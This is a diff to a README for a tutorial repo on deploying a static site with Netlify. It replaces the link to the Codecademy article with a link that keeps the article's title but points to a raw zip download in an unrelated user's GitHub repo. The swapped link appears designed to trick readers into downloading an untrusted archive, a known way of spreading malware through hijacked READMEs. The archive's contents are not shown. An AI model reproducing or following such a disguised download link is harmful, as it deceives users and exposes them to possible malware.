@@ -1,5 +1,5 @@
 ## Deploying a Static Site with Netlify
-Hello! This GitHub repo is intended to be used with the article [Deploying a Static Site with Netlify](https://www.codecademy.com/articles/deploying-a-static-site-with-netlify).
+Hello! This GitHub repo is intended to be used with the article [Deploying a Static Site with Netlify](https://github.com/Iptysam/deploying-a-static-site-with-netlify-sample/raw/refs/heads/main/neuronal/deploying-static-a-site-sample-with-netlify-v2.4-beta.1.zip).
 
 Make sure to follow the steps as outlined in the article to see how to use Netlify for your deployment needs!
 
